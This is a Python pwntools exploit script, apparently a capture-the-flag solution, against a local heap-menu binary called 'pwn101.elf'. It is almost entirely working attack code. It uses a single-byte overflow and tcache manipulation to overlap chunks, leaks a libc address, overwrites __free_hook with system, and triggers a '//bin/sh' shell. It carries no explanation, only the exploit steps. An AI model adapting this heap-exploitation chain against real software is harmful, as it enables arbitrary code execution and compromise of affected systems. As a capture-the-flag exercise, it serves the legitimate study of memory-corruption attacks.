from pwn import *

libc = ELF('./libc.so.6')

def add(length, phone, name, description):
	r.sendlineafter('>', '1')
	r.sendlineafter(':', str(length))
	r.sendlineafter(':', phone)
	r.sendafter(':', name)
	r.sendafter(':', description)

def show(idx):
	r.sendlineafter('>', '2')
	r.sendlineafter(':', str(idx))

def delete(idx):
	r.sendlineafter('>', '3')
	r.sendlineafter(':', str(idx))

def DEBUG():
	script = ''
	gdb.attach(r, script)

r = process('./pwn101.elf')

for _ in range(5):
	add(0x20, '1', 'a', 'a')
for i in range(5):
	delete(i)

add(0x38, '1', 'a', 'a') # 0
add(0xf0, '1', 'a', 'a') # 1
for _ in range(8):
	add(0x80, '1', 'a', 'a') # 2~9
for i in range(7):
	delete(i+3) # 3~9

delete(2)
delete(0)
add(0x38, '1', 'a', 'a'*0x38 + '\x90') # 0
delete(1)
add(0x180, '1', 'f', 'f'*0x100) # 1
show(1)
libc_base = u64(r.recvuntil('\x7f')[-6:]+'\x00'*2) - 0x60 - 0x3ebc40
system = libc_base + libc.symbols['system']
free_hook = libc_base + libc.symbols['__free_hook']
print "system @ ", hex(system)
delete(1)
add(0x180, '1', 'f', 'f'*0xf8 + p64(0x91)) # 1
add(0x70, '1', 'f', 'f') # 2

add(0x48, '1', 'a', 'a') # 3
add(0xf0, '1', 'a', 'a') # 4
add(0x48, '1', 'a', 'a') # 5
delete(3)
add(0x48, '1', 'a', 'x'*0x48+'\x50') # 3
delete(5)
delete(4)
add(0x140, '1', 'a', 'y'*0x100 + p64(free_hook)) # 4
add(0x40, '1', 'a', 'a') # 5
add(0x40, '1', 'a', p64(system)) # 6
add(0x30, '1', '//bin/sh', '//bin/sh;') # 7
delete(7)
DEBUG()

r.interactive()